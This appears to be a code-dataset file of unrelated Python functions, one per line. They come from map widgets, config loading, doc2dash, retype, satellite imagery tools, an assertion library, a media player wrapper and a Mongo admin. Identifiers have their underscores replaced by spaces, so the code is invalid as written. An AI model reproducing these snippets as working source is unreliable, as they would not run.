def init options ( self ) : self . options = Google Map Options ( ) d = self . declaration self . set map type ( d . map type ) if d . ambient mode : self . set ambient mode ( d . ambient mode ) if ( d . camera position or d . camera zoom or d . camera tilt or d . camera bearing ) : self . update camera ( ) if d . map bounds : self . set map bounds ( d . map bounds ) if not d . show compass : self . set show compass ( d . show compass ) if not d . show zoom controls : self . set show zoom controls ( d . show zoom controls ) if not d . show toolbar : self . set show toolbar ( d . show toolbar ) if d . lite mode : self . set lite mode ( d . lite mode ) if not d . rotate gestures : self . set rotate gestures ( d . rotate gestures ) if not d . scroll gestures : self . set scroll gestures ( d . scroll gestures ) if not d . tilt gestures : self . set tilt gestures ( d . tilt gestures ) if not d . zoom gestures : self . set zoom gestures ( d . zoom gestures ) if d . min zoom : self . set min zoom ( d . min zoom ) if d . max zoom : self . set max zoom ( d . max zoom )
def init map ( self ) : d = self . declaration if d . show location : self . set show location ( d . show location ) if d . show traffic : self . set show traffic ( d . show traffic ) if d . show indoors : self . set show indoors ( d . show indoors ) if d . show buildings : self . set show buildings ( d . show buildings ) #: Local ref access is faster mapview = self . map mid = mapview . get Id ( ) #: Connect signals #: Camera mapview . on Camera Change . connect ( self . on camera changed ) mapview . on Camera Move Started . connect ( self . on camera move started ) mapview . on Camera Move Canceled . connect ( self . on camera move stopped ) mapview . on Camera Idle . connect ( self . on camera move stopped ) mapview . set On Camera Change Listener ( mid ) mapview . set On Camera Move Started Listener ( mid ) mapview . set On Camera Move Canceled Listener ( mid ) mapview . set On Camera Idle Listener ( mid ) #: Clicks mapview . on Map Click . connect ( self . on map clicked ) mapview . set On Map Click Listener ( mid ) mapview . on Map Long Click . connect ( self . on map long clicked ) mapview . set On Map Long Click Listener ( mid ) #: Markers mapview . on Marker Click . connect ( self . on marker clicked ) mapview . set On Marker Click Listener ( self . map . get Id ( ) ) mapview . on Marker Drag Start . connect ( self . on marker drag start ) mapview . on Marker Drag . connect ( self . on marker drag ) mapview . on Marker Drag End . connect ( self . on marker drag end ) mapview . set On Marker Drag Listener ( mid ) #: Info window mapview . on Info Window Click . connect ( self . on info window clicked ) mapview . on Info Window Long Click . connect ( self . on info window long clicked ) mapview . on Info Window Close . connect ( self . on info window closed ) mapview . set On Info Window Click Listener ( mid ) mapview . set On Info Window Close Listener ( mid ) mapview . set On Info Window Long Click Listener ( mid ) #: Polys mapview . on Polygon Click . connect ( self . on poly clicked ) mapview . on Polyline Click . connect ( self . on poly clicked ) mapview . set On Polygon Click Listener ( mid ) mapview . set On Polyline Click Listener ( mid ) #: Circle mapview . on Circle Click . connect ( self . on circle clicked ) mapview . set On Circle Click Listener ( mid )
def on map fragment created ( self , obj id ) : self . fragment = Map Fragment ( id = obj id ) #: Setup callback so we know when the map is ready self . map . on Map Ready . connect ( self . on map ready ) self . fragment . get Map Async ( self . map . get Id ( ) ) context = self . get context ( ) def on transaction ( id ) : trans = Fragment Transaction ( id = id ) trans . add ( self . widget . get Id ( ) , self . fragment ) trans . commit ( ) def on fragment manager ( id ) : fm = Fragment Manager ( id = id ) fm . begin Transaction ( ) . then ( on transaction ) context . widget . get Support Fragment Manager ( ) . then ( on fragment manager )
def on map clicked ( self , pos ) : d = self . declaration d . clicked ( { 'click' : 'short' , 'position' : tuple ( pos ) } )
def on map long clicked ( self , pos ) : d = self . declaration d . clicked ( { 'click' : 'long' , 'position' : tuple ( pos ) } )
def destroy ( self ) : marker = self . marker parent = self . parent ( ) if marker : if parent : del parent . markers [ marker . id ] marker . remove ( ) super ( Android Map Item Base , self ) . destroy ( )
def child added ( self , child ) : if child . widget : # TODO: Should we keep count and remove the adapter if not all # markers request it? self . parent ( ) . init info window adapter ( ) super ( Android Map Marker , self ) . child added ( child )
def on marker ( self , marker ) : mid , pos = marker self . marker = Marker ( id = mid ) mapview = self . parent ( ) # Save ref mapview . markers [ mid ] = self # Required so the packer can pass the id self . marker . set Tag ( mid ) # If we have a child widget we must configure the map to use the # custom adapter for w in self . child widgets ( ) : mapview . init info window adapter ( ) break d = self . declaration if d . show info : self . set show info ( d . show info ) #: Can free the options now del self . options
def on marker ( self , mid ) : self . marker = Circle ( id = mid ) self . parent ( ) . markers [ mid ] = self #: Required so the packer can pass the id self . marker . set Tag ( mid ) d = self . declaration if d . clickable : self . set clickable ( d . clickable ) #: Can free the options now del self . options
def data ( self , X = None , y = None , sentences = None ) : self . X = X self . y = y self . sentences = sentences
def train ( self ) : for i , model in enumerate ( self . models ) : N = [ int ( i * len ( self . y ) ) for i in self . lc range ] for n in N : X = self . X [ : n ] y = self . y [ : n ] e = Experiment ( X , y , model . estimator , self . scores , self . validation method ) e . log folder = self . log folder e . train ( )
def print cm ( cm , labels , hide zeroes = False , hide diagonal = False , hide threshold = None ) : columnwidth = max ( [ len ( x ) for x in labels ] + [ 5 ] ) # 5 is value length empty cell = " " * columnwidth # Print header print ( "    " + empty cell , end = " " ) for label in labels : print ( "%{0}s" . format ( columnwidth ) % label , end = " " ) print ( ) # Print rows for i , label1 in enumerate ( labels ) : print ( "    %{0}s" . format ( columnwidth ) % label1 , end = " " ) for j in range ( len ( labels ) ) : cell = "%{0}.1f" . format ( columnwidth ) % cm [ i , j ] if hide zeroes : cell = cell if float ( cm [ i , j ] ) != 0 else empty cell if hide diagonal : cell = cell if i != j else empty cell if hide threshold : cell = cell if cm [ i , j ] > hide threshold else empty cell print ( cell , end = " " ) print ( )
def config sources ( app , environment , cluster , configs dirs , app dir , local = False , build = False ) : sources = [ # Machine-specific ( configs dirs , 'hostname' ) , ( configs dirs , 'hostname-local' ) , ( configs dirs , 'hostname-build' ) , # Global ( configs dirs , 'common' ) , # Environment + Cluster ( configs dirs , 'common-%s' % environment ) , ( configs dirs , 'common-%s-%s' % ( environment , cluster ) ) , ( configs dirs , 'common-local' ) , ( configs dirs , 'common-build' ) , # Machine-specific overrides ( configs dirs , 'common-overrides' ) , # Application-specific ( [ app dir ] , '%s-default' % app ) , ( [ app dir ] , '%s-%s' % ( app , environment ) ) , ( [ app dir ] , '%s-%s-%s' % ( app , environment , cluster ) ) , ( configs dirs , app ) , ( configs dirs , '%s-%s' % ( app , environment ) ) , ( configs dirs , '%s-%s-%s' % ( app , environment , cluster ) ) , ( [ app dir ] , '%s-local' % app ) , ( [ app dir ] , '%s-build' % app ) , ( configs dirs , '%s-local' % app ) , ( configs dirs , '%s-build' % app ) , # Machine-specific application override ( configs dirs , '%s-overrides' % app ) , ] # Filter out build sources if not requested if not build : sources = [ source for source in sources if not source [ 1 ] . endswith ( '-build' ) ] # Filter out local sources if not build and not local if not local : sources = [ source for source in sources if not source [ 1 ] . endswith ( '-local' ) ] return available sources ( sources )
def available sources ( sources ) : for dirs , name in sources : for directory in dirs : fn = os . path . join ( directory , name ) + '.py' if os . path . isfile ( fn ) : yield fn
def smush config ( sources , initial = None ) : if initial is None : initial = { } config = Dot Dict ( initial ) for fn in sources : log . debug ( 'Merging %s' , fn ) mod = get config module ( fn ) config = mod . update ( config ) log . debug ( 'Current config:\n%s' , json . dumps ( config , indent = 4 , cls = Lenient JSON Encoder ) ) return config
def filter dict ( unfiltered , filter keys ) : filtered = Dot Dict ( ) for k in filter keys : filtered [ k ] = unfiltered [ k ] return filtered
def filter config ( config , deploy config ) : if not os . path . isfile ( deploy config ) : return Dot Dict ( ) config module = get config module ( deploy config ) return config module . filter ( config )
def seeded auth token ( client , service , seed ) : hash func = hashlib . md5 ( ) token = ',' . join ( ( client , service , seed ) ) . encode ( 'utf-8' ) hash func . update ( token ) return hash func . hexdigest ( )
def write config ( config , app dir , filename = 'configuration.json' ) : path = os . path . join ( app dir , filename ) with open ( path , 'w' ) as f : json . dump ( config , f , indent = 4 , cls = Detect Missing Encoder , separators = ( ',' , ': ' ) )
def validate date ( date text ) : try : if int ( date text ) < 0 : return True except Value Error : pass try : datetime . strptime ( date text , '%Y-%m-%d' ) return True except Value Error : pass raise Value Error ( 'Dates must be negative integers or YYYY-MM-DD in the past.' )
def get download total ( rows ) : headers = rows . pop ( 0 ) index = headers . index ( 'download count' ) total downloads = sum ( int ( row [ index ] ) for row in rows ) rows . insert ( 0 , headers ) return total downloads , index
def add download total ( rows ) : total row = [ "" ] * len ( rows [ 0 ] ) total row [ 0 ] = "Total" total downloads , downloads column = get download total ( rows ) total row [ downloads column ] = str ( total downloads ) rows . append ( total row ) return rows
def find and patch entry ( soup , entry ) : link = soup . find ( "a" , { "class" : "headerlink" } , href = "#" + entry . anchor ) tag = soup . new tag ( "a" ) tag [ "name" ] = APPLE REF TEMPLATE . format ( entry . type , entry . name ) if link : link . parent . insert ( 0 , tag ) return True elif entry . anchor . startswith ( "module-" ) : soup . h1 . parent . insert ( 0 , tag ) return True else : return False
def main ( source , force , name , quiet , verbose , destination , add to dash , add to global , icon , index page , enable js , online redirect url , parser , ) : try : logging . config . dict Config ( create log config ( verbose = verbose , quiet = quiet ) ) except Value Error as e : click . secho ( e . args [ 0 ] , fg = "red" ) raise System Exit ( 1 ) if icon : icon data = icon . read ( ) if not icon data . startswith ( PNG HEADER ) : log . error ( '"{}" is not a valid PNG image.' . format ( click . format filename ( icon . name ) ) ) raise System Exit ( 1 ) else : icon data = None source , dest , name = setup paths ( source , destination , name = name , add to global = add to global , force = force , ) if parser is None : parser = parsers . get doctype ( source ) if parser is None : log . error ( '"{}" does not contain a known documentation format.' . format ( click . format filename ( source ) ) ) raise System Exit ( errno . EINVAL ) docset = prepare docset ( source , dest , name , index page , enable js , online redirect url ) doc parser = parser ( doc path = docset . docs ) log . info ( ( "Converting " + click . style ( "{parser name}" , bold = True ) + ' docs from "{src}" to "{dst}".' ) . format ( parser name = parser . name , src = click . format filename ( source , shorten = True ) , dst = click . format filename ( dest ) , ) ) with docset . db conn : log . info ( "Parsing documentation..." ) toc = patch anchors ( doc parser , show progressbar = not quiet ) for entry in doc parser . parse ( ) : docset . db conn . execute ( "INSERT INTO search Index VALUES (NULL, ?, ?, ?)" , entry . as tuple ( ) , ) toc . send ( entry ) count = docset . db conn . execute ( "SELECT COUNT(1) FROM search Index" ) . fetchone ( ) [ 0 ] log . info ( ( "Added " + click . style ( "{count:,}" , fg = "green" if count > 0 else "red" ) + " index entries." ) . format ( count = count ) ) toc . close ( ) if icon data : add icon ( icon data , dest ) if add to dash or add to global : log . info ( "Adding to Dash.app..." ) os . system ( 'open -a dash "{}"' . format ( dest ) )
def create log config ( verbose , quiet ) : if verbose and quiet : raise Value Error ( "Supplying both --quiet and --verbose makes no sense." ) elif verbose : level = logging . DEBUG elif quiet : level = logging . ERROR else : level = logging . INFO logger cfg = { "handlers" : [ "click handler" ] , "level" : level } return { "version" : 1 , "formatters" : { "click formatter" : { "format" : "%(message)s" } } , "handlers" : { "click handler" : { "level" : level , "class" : "doc2dash. main .Click Echo Handler" , "formatter" : "click formatter" , } } , "loggers" : { "doc2dash" : logger cfg , " main " : logger cfg } , }
def setup paths ( source , destination , name , add to global , force ) : if source [ - 1 ] == "/" : source = source [ : - 1 ] if not name : name = os . path . split ( source ) [ - 1 ] elif name . endswith ( ".docset" ) : name = name . replace ( ".docset" , "" ) if add to global : destination = DEFAULT DOCSET PATH dest = os . path . join ( destination or "" , name + ".docset" ) dst exists = os . path . lexists ( dest ) if dst exists and force : shutil . rmtree ( dest ) elif dst exists : log . error ( 'Destination path "{}" already exists.' . format ( click . format filename ( dest ) ) ) raise System Exit ( errno . EEXIST ) return source , dest , name
def add icon ( icon data , dest ) : with open ( os . path . join ( dest , "icon.png" ) , "wb" ) as f : f . write ( icon data )
def has file with ( path , filename , content ) : try : with open ( os . path . join ( path , filename ) , "rb" ) as f : return content in f . read ( ) except IO Error as e : if e . errno == errno . ENOENT : return False else : raise
def to atomic ( amount ) : if not isinstance ( amount , ( Decimal , float ) + integer types ) : raise Value Error ( "Amount '{}' doesn't have numeric type. Only Decimal, int, long and " "float (not recommended) are accepted as amounts." ) return int ( amount * 10 ** 12 )
def encode ( cls , hex ) : out = [ ] for i in range ( len ( hex ) // 8 ) : word = endian swap ( hex [ 8 * i : 8 * i + 8 ] ) x = int ( word , 16 ) w1 = x % cls . n w2 = ( x // cls . n + w1 ) % cls . n w3 = ( x // cls . n // cls . n + w2 ) % cls . n out += [ cls . word list [ w1 ] , cls . word list [ w2 ] , cls . word list [ w3 ] ] checksum = cls . get checksum ( " " . join ( out ) ) out . append ( checksum ) return " " . join ( out )
def decode ( cls , phrase ) : phrase = phrase . split ( " " ) out = "" for i in range ( len ( phrase ) // 3 ) : word1 , word2 , word3 = phrase [ 3 * i : 3 * i + 3 ] w1 = cls . word list . index ( word1 ) w2 = cls . word list . index ( word2 ) % cls . n w3 = cls . word list . index ( word3 ) % cls . n x = w1 + cls . n * ( ( w2 - w1 ) % cls . n ) + cls . n * cls . n * ( ( w3 - w2 ) % cls . n ) out += endian swap ( "%08x" % x ) return out
def get operator ( self , op ) : if op in self . OPERATORS : return self . OPERATORS . get ( op ) try : n args = len ( inspect . getargspec ( op ) [ 0 ] ) if n args != 2 : raise Type Error except : eprint ( 'Error: invalid operator function. Operators must accept two args.' ) raise else : return op
def format answers ( self , fmt = 'obj' ) : fmts = ( 'obj' , 'array' , 'plain' ) if fmt not in fmts : eprint ( "Error: '{}' not in {}" . format ( fmt , fmts ) ) return def stringify ( val ) : if type ( val ) in ( list , tuple ) : return ', ' . join ( str ( e ) for e in val ) return val if fmt == 'obj' : return json . dumps ( self . answers ) elif fmt == 'array' : answers = [ [ k , v ] for k , v in self . answers . items ( ) ] return json . dumps ( answers ) elif fmt == 'plain' : answers = '\n' . join ( '{}: {}' . format ( k , stringify ( v ) ) for k , v in self . answers . items ( ) ) return answers
def answer display ( self , s = '' ) : padding = len ( max ( self . questions . keys ( ) , key = len ) ) + 5 for key in list ( self . answers . keys ( ) ) : s += '{:>{}} : {}\n' . format ( key , padding , self . answers [ key ] ) return s
def train and save ( obj , cache , data , print updates ) : obj . train ( data ) if print updates : print ( 'Regenerated ' + obj . name + '.' ) obj . save ( cache )
def main ( src , pyi dir , target dir , incremental , quiet , replace any , hg , traceback ) : Config . incremental = incremental Config . replace any = replace any returncode = 0 for src entry in src : for file , error , exc type , tb in retype path ( Path ( src entry ) , pyi dir = Path ( pyi dir ) , targets = Path ( target dir ) , src explicitly given = True , quiet = quiet , hg = hg , ) : print ( f'error: {file}: {error}' , file = sys . stderr ) if traceback : print ( 'Traceback (most recent call last):' , file = sys . stderr ) for line in tb : print ( line , file = sys . stderr , end = '' ) print ( f'{exc type. name }: {error}' , file = sys . stderr ) returncode += 1 if not src and not quiet : print ( 'warning: no sources given' , file = sys . stderr ) # According to http://tldp.org/LDP/abs/html/index.html starting with 126 # we have special returncodes. sys . exit ( min ( returncode , 125 ) )
def retype path ( src , pyi dir , targets , * , src explicitly given = False , quiet = False , hg = False ) : if src . is dir ( ) : for child in src . iterdir ( ) : if child == pyi dir or child == targets : continue yield from retype path ( child , pyi dir / src . name , targets / src . name , quiet = quiet , hg = hg , ) elif src . suffix == '.py' or src explicitly given : try : retype file ( src , pyi dir , targets , quiet = quiet , hg = hg ) except Exception as e : yield ( src , str ( e ) , type ( e ) , traceback . format tb ( e . traceback ) , )
def lib2to3 parse ( src txt ) : grammar = pygram . python grammar no print statement drv = driver . Driver ( grammar , pytree . convert ) if src txt [ - 1 ] != '\n' : nl = '\r\n' if '\r\n' in src txt [ : 1024 ] else '\n' src txt += nl try : result = drv . parse string ( src txt , True ) except Parse Error as pe : lineno , column = pe . context [ 1 ] lines = src txt . splitlines ( ) try : faulty line = lines [ lineno - 1 ] except Index Error : faulty line = "<line number missing in source>" raise Value Error ( f"Cannot parse: {lineno}:{column}: {faulty line}" ) from None if isinstance ( result , Leaf ) : result = Node ( syms . file input , [ result ] ) return result
def lib2to3 unparse ( node , * , hg = False ) : code = str ( node ) if hg : from retype hgext import apply job security code = apply job security ( code ) return code
def fix remaining type comments ( node ) : assert node . type == syms . file input last n = None for n in node . post order ( ) : if last n is not None : if n . type == token . NEWLINE and is assignment ( last n ) : fix variable annotation type comment ( n , last n ) elif n . type == syms . funcdef and last n . type == syms . suite : fix signature annotation type comment ( n , last n , offset = 1 ) elif n . type == syms . async funcdef and last n . type == syms . suite : fix signature annotation type comment ( n , last n , offset = 2 ) last n = n
def parse type comment ( type comment ) : try : result = ast3 . parse ( type comment , '<type comment>' , 'eval' ) except Syntax Error : raise Value Error ( f"invalid type comment: {type comment!r}" ) from None assert isinstance ( result , ast3 . Expression ) return result . body
def remove function signature type comment ( body ) : for node in body . children : if node . type == token . INDENT : prefix = node . prefix . lstrip ( ) if prefix . startswith ( '# type: ' ) : node . prefix = '\n' . join ( prefix . split ( '\n' ) [ 1 : ] ) break
def new ( n , prefix = None ) : if isinstance ( n , Leaf ) : return Leaf ( n . type , n . value , prefix = n . prefix if prefix is None else prefix ) # this is hacky, we assume complex nodes are just being reused once from the # original AST. n . parent = None if prefix is not None : n . prefix = prefix return n
def histogram match ( self , use bands , blm source = None , * * kwargs ) : assert has rio , "To match image histograms please install rio hist" data = self . read ( self [ use bands , ... ] , * * kwargs ) data = np . rollaxis ( data . astype ( np . float32 ) , 0 , 3 ) if 0 in data : data = np . ma . masked values ( data , 0 ) bounds = self . reproject ( box ( * self . bounds ) , from proj = self . proj , to proj = "EPSG:4326" ) . bounds if blm source == 'browse' : from gbdxtools . images . browse image import Browse Image ref = Browse Image ( self . cat id , bbox = bounds ) . read ( ) else : from gbdxtools . images . tms image import Tms Image tms = Tms Image ( zoom = self . calc tms zoom ( self . affine [ 0 ] ) , bbox = bounds , * * kwargs ) ref = np . rollaxis ( tms . read ( ) , 0 , 3 ) out = np . dstack ( [ rio match ( data [ : , : , idx ] , ref [ : , : , idx ] . astype ( np . double ) / 255.0 ) for idx in range ( data . shape [ - 1 ] ) ] ) if 'stretch' in kwargs or 'gamma' in kwargs : return self . histogram stretch ( out , * * kwargs ) else : return out
def histogram stretch ( self , use bands , * * kwargs ) : data = self . read ( self [ use bands , ... ] , * * kwargs ) data = np . rollaxis ( data . astype ( np . float32 ) , 0 , 3 ) return self . histogram stretch ( data , * * kwargs )
def deprecate module attr ( mod , deprecated ) : deprecated = set ( deprecated ) class Wrapper ( object ) : def getattr ( self , attr ) : if attr in deprecated : warnings . warn ( "Property {} is deprecated" . format ( attr ) , GBDX Deprecation ) return getattr ( mod , attr ) def setattr ( self , attr , value ) : if attr in deprecated : warnings . warn ( "Property {} is deprecated" . format ( attr ) , GBDX Deprecation ) return setattr ( mod , attr , value ) return Wrapper ( )
def get matching multiplex port ( self , name ) : # short circuit:  if the attribute name already exists return none # if name in self. portnames: return None # if not len([p for p in self. portnames if name.startswith(p) and name != p]): return None matching multiplex ports = [ self . getattribute ( p ) for p in self . portnames if name . startswith ( p ) and name != p and hasattr ( self , p ) and self . getattribute ( p ) . is multiplex ] for port in matching multiplex ports : return port return None
def ingest vectors ( self , output port value ) : # append two tasks to self['definition']['tasks'] ingest task = Task ( 'Ingest Item Json To Vector Services' ) ingest task . inputs . items = output port value ingest task . impersonation allowed = True stage task = Task ( 'Stage Data To S3' ) stage task . inputs . destination = 's3://{vector ingest bucket}/{recipe id}/{run id}/{task name}' stage task . inputs . data = ingest task . outputs . result . value self . definition [ 'tasks' ] . append ( ingest task . generate task workflow json ( ) ) self . definition [ 'tasks' ] . append ( stage task . generate task workflow json ( ) )
def tilemap ( self , query , styles = { } , bbox = [ - 180 , - 90 , 180 , 90 ] , zoom = 16 , api key = os . environ . get ( 'MAPBOX API KEY' , None ) , image = None , image bounds = None , index = "vector-user-provided" , name = "GBDX Task Output" , * * kwargs ) : try : from I Python . display import display except : print ( "I Python is required to produce maps." ) return assert api key is not None , "No Mapbox API Key found. You can either pass in a token or set the MAPBOX API KEY environment variable." wkt = box ( * bbox ) . wkt features = self . query ( wkt , query , index = index ) union = cascaded union ( [ shape ( f [ 'geometry' ] ) for f in features ] ) lon , lat = union . centroid . coords [ 0 ] url = 'https://vector.geobigdata.io/insight-vector/api/mvt/{z}/{x}/{y}?' url += 'q={}&index={}' . format ( query , index ) if styles is not None and not isinstance ( styles , list ) : styles = [ styles ] map id = "map {}" . format ( str ( int ( time . time ( ) ) ) ) map data = Vector Tile Layer ( url , source name = name , styles = styles , * * kwargs ) image layer = self . build image layer ( image , image bounds ) template = Base Template ( map id , * * { "lat" : lat , "lon" : lon , "zoom" : zoom , "datasource" : json . dumps ( map data . datasource ) , "layers" : json . dumps ( map data . layers ) , "image layer" : image layer , "mbkey" : api key , "token" : self . gbdx connection . access token } ) template . inject ( )
def parse geoms ( self , * * kwargs ) : bbox = kwargs . get ( 'bbox' , None ) wkt geom = kwargs . get ( 'wkt' , None ) geojson = kwargs . get ( 'geojson' , None ) if bbox is not None : g = box ( * bbox ) elif wkt geom is not None : g = wkt . loads ( wkt geom ) elif geojson is not None : g = shape ( geojson ) else : return None if self . proj is None : return g else : return self . reproject ( g , from proj = kwargs . get ( 'from proj' , 'EPSG:4326' ) )
def load url ( url , shape = ( 8 , 256 , 256 ) ) : thread id = threading . current thread ( ) . ident curl = curl pool [ thread id ] curl . setopt ( curl . URL , url ) curl . setopt ( pycurl . NOSIGNAL , 1 ) , ext = os . path . splitext ( urlparse ( url ) . path ) with Named Temporary File ( prefix = "gbdxtools" , suffix = "." + ext , delete = False ) as temp : # TODO: apply correct file extension curl . setopt ( curl . WRITEDATA , temp . file ) curl . perform ( ) code = curl . getinfo ( pycurl . HTTP CODE ) try : if ( code != 200 ) : raise Type Error ( "Request for {} returned unexpected error code: {}" . format ( url , code ) ) arr = np . rollaxis ( imread ( temp ) , 2 , 0 ) except Exception as e : print ( e ) temp . seek ( 0 ) print ( temp . read ( ) ) arr = np . zeros ( shape , dtype = np . uint8 ) curl . close ( ) del curl pool [ thread id ] finally : temp . file . flush ( ) temp . close ( ) os . remove ( temp . name ) return arr
def tile coords ( self , bounds ) : tfm = partial ( pyproj . transform , pyproj . Proj ( init = "epsg:3857" ) , pyproj . Proj ( init = "epsg:4326" ) ) bounds = ops . transform ( tfm , box ( * bounds ) ) . bounds # because tiles have a common corner, the tiles that cover a # given tile includes the adjacent neighbors. west , south , east , north = bounds epsilon = 1.0e-10 if east != west and north != south : # 2D bbox # shrink the bounds a small amount so that # shapes/tiles round trip. west += epsilon south += epsilon east -= epsilon north -= epsilon params = [ west , south , east , north , [ self . zoom level ] ] tile coords = [ ( tile . x , tile . y ) for tile in mercantile . tiles ( * params ) ] xtiles , ytiles = zip ( * tile coords ) minx = min ( xtiles ) miny = min ( ytiles ) maxx = max ( xtiles ) maxy = max ( ytiles ) return minx , miny , maxx , maxy
def load url ( url , token , shape = ( 8 , 256 , 256 ) ) : , ext = os . path . splitext ( urlparse ( url ) . path ) success = False for i in xrange ( MAX RETRIES ) : thread id = threading . current thread ( ) . ident curl = curl pool [ thread id ] curl . setopt ( curl . URL , url ) curl . setopt ( pycurl . NOSIGNAL , 1 ) curl . setopt ( pycurl . HTTPHEADER , [ 'Authorization: Bearer {}' . format ( token ) ] ) with Named Temporary File ( prefix = "gbdxtools" , suffix = ext , delete = False ) as temp : # TODO: apply correct file extension curl . setopt ( curl . WRITEDATA , temp . file ) curl . perform ( ) code = curl . getinfo ( pycurl . HTTP CODE ) try : if ( code != 200 ) : raise Type Error ( "Request for {} returned unexpected error code: {}" . format ( url , code ) ) temp . file . flush ( ) temp . close ( ) arr = imread ( temp . name ) if len ( arr . shape ) == 3 : arr = np . rollaxis ( arr , 2 , 0 ) else : arr = np . expand dims ( arr , axis = 0 ) success = True return arr except Exception as e : curl . close ( ) del curl pool [ thread id ] finally : temp . close ( ) os . remove ( temp . name ) if success is False : raise Type Error ( "Request for {} returned unexpected error code: {}" . format ( url , code ) ) return arr
def validate ( method ) : # Name error template name error = 'configuration option "{}" is not supported' @ functools . wraps ( method ) def validator ( self , name , * args ) : if name not in self . allowed opts : raise Value Error ( name error . format ( name ) ) return method ( self , name , * args ) return validator
def run ( self , ctx ) : # Reverse engine assertion if needed if ctx . reverse : self . engine . reverse ( ) if self . engine . empty : raise Assertion Error ( 'grappa: no assertions to run' ) try : # Run assertion in series and return error, if present return self . run assertions ( ctx ) except Exception as err : # Handle legit grappa internval errors if getattr ( err , ' legit ' , False ) : raise err # Otherwise render it return self . render error ( ctx , err )
def run matcher ( self , subject , * expected , * * kw ) : # Update assertion expectation self . expected = expected args = ( subject , ) if self . kind == Operator Types . MATCHER : args += expected try : result = self . match ( * args , * * kw ) except Exception as error : return self . make error ( error = error ) reasons = [ ] if isinstance ( result , tuple ) : result , reasons = result if result is False and self . ctx . negate : return True if result is True and not self . ctx . negate : return True return self . make error ( reasons = reasons )
def load ( ) : for operator in operators : module , symbols = operator [ 0 ] , operator [ 1 : ] path = 'grappa.operators.{}' . format ( module ) # Dynamically import modules operator = import ( path , None , None , symbols ) # Register operators in the test engine for symbol in symbols : Engine . register ( getattr ( operator , symbol ) )
def register operators ( * operators ) : def validate ( operator ) : if isoperator ( operator ) : return True raise Not Implemented Error ( 'invalid operator: {}' . format ( operator ) ) def register ( operator ) : # Register operator by DSL keywords for name in operator . operators : # Check valid operators if name in Engine . operators : raise Value Error ( 'operator name "{}" from {} is already ' 'in use by other operator' . format ( name , operator . name ) ) # Register operator by name Engine . operators [ name ] = operator # Validates and registers operators [ register ( operator ) for operator in operators if validate ( operator ) ]
def play pause ( self ) : self . player interface . Play Pause ( ) self . is playing = not self . is playing if self . is playing : self . play Event ( self ) else : self . pause Event ( self )
def play sync ( self ) : self . play ( ) logger . info ( "Playing synchronously" ) try : time . sleep ( 0.05 ) logger . debug ( "Wait for playing to start" ) while self . is playing ( ) : time . sleep ( 0.05 ) except D Bus Exception : logger . error ( "Cannot play synchronously any longer as D Bus calls timed out." )
def play ( self ) : if not self . is playing ( ) : self . play pause ( ) self . is playing = True self . play Event ( self )
def quit ( self ) : if self . process is None : logger . debug ( 'Quit was called after self. process had already been released' ) return try : logger . debug ( 'Quitting OMX Player' ) process group id = os . getpgid ( self . process . pid ) os . killpg ( process group id , signal . SIGTERM ) logger . debug ( 'SIGTERM Sent to pid: %s' % process group id ) self . process monitor . join ( ) except OS Error : logger . error ( 'Could not find the process to kill' ) self . process = None
def has edit permission ( self , request ) : return request . user . is authenticated and request . user . is active and request . user . is staff
def has add permission ( self , request ) : return request . user . is authenticated and request . user . is active and request . user . is staff
def has delete permission ( self , request ) : return request . user . is authenticated and request . user . is active and request . user . is superuser
def set fields ( self ) : # Get dictionary map of current model if self . is initialized : self . model map dict = self . create document dictionary ( self . model instance ) else : self . model map dict = self . create document dictionary ( self . model ) form field dict = self . get form field dict ( self . model map dict ) self . set form fields ( form field dict )
def get form ( self ) : self . set fields ( ) if self . post data dict is not None : self . set post data ( ) return self . form
def get widget ( model field , disabled = False ) : attrs = get attrs ( model field , disabled ) if hasattr ( model field , "max length" ) and not model field . max length : return forms . Textarea ( attrs = attrs ) elif isinstance ( model field , Date Time Field ) : return forms . Date Time Input ( attrs = attrs ) elif isinstance ( model field , Boolean Field ) : return forms . Checkbox Input ( attrs = attrs ) elif isinstance ( model field , Reference Field ) or model field . choices : return forms . Select ( attrs = attrs ) elif ( isinstance ( model field , List Field ) or isinstance ( model field , Embedded Document Field ) or isinstance ( model field , Geo Point Field ) ) : return None else : return forms . Text Input ( attrs = attrs )
def get attrs ( model field , disabled = False ) : attrs = { } attrs [ 'class' ] = 'span6 xlarge' if disabled or isinstance ( model field , Object Id Field ) : attrs [ 'class' ] += ' disabled' attrs [ 'readonly' ] = 'readonly' return attrs
def get form field class ( model field ) : FIELD MAPPING = { Int Field : forms . Integer Field , String Field : forms . Char Field , Float Field : forms . Float Field , Boolean Field : forms . Boolean Field , Date Time Field : forms . Date Time Field , Decimal Field : forms . Decimal Field , URL Field : forms . URL Field , Email Field : forms . Email Field } return FIELD MAPPING . get ( model field . class , forms . Char Field )
def get document value ( document , key ) : value = getattr ( document , key ) if isinstance ( value , Object Id ) : return value if isinstance ( document . fields . get ( key ) , URL Field ) : return mark safe ( """<a href="{0}">{1}</a>""" . format ( value , value ) ) if isinstance ( value , Document ) : app label = value . module . replace ( ".models" , "" ) document name = value . class name url = reverse ( "document detail" , kwargs = { 'app label' : app label , 'document name' : document name , 'id' : value . id } ) return mark safe ( """<a href="{0}">{1}</a>""" . format ( url , value ) ) return value
def get context data ( self , * * kwargs ) : context = super ( Document List View , self ) . get context data ( * * kwargs ) context = self . set permissions in context ( context ) if not context [ 'has view permission' ] : return Http Response Forbidden ( "You do not have permissions to view this content." ) context [ 'object list' ] = self . get queryset ( ) context [ 'document' ] = self . document context [ 'app label' ] = self . app label context [ 'document name' ] = self . document name context [ 'request' ] = self . request # pagination bits context [ 'page' ] = self . page context [ 'documents per page' ] = self . documents per page if self . page > 1 : previous page number = self . page - 1 else : previous page number = None if self . page < self . total pages : next page number = self . page + 1 else : next page number = None context [ 'previous page number' ] = previous page number context [ 'has previous page' ] = previous page number is not None context [ 'next page number' ] = next page number context [ 'has next page' ] = next page number is not None context [ 'total pages' ] = self . total pages # Part of upcoming list view form functionality if self . queryset . count ( ) : context [ 'keys' ] = [ 'id' , ] # Show those items for which we've got list fields on the mongoadmin for key in [ x for x in self . mongoadmin . list fields if x != 'id' and x in self . document . fields . keys ( ) ] : # TODO - Figure out why this Embedded Document Field and List Field breaks this view # Note - This is the challenge part, right? :) if isinstance ( self . document . fields [ key ] , Embedded Document Field ) : continue if isinstance ( self . document . fields [ key ] , List Field ) : continue context [ 'keys' ] . append ( key ) if self . mongoadmin . search fields : context [ 'search field' ] = True return context
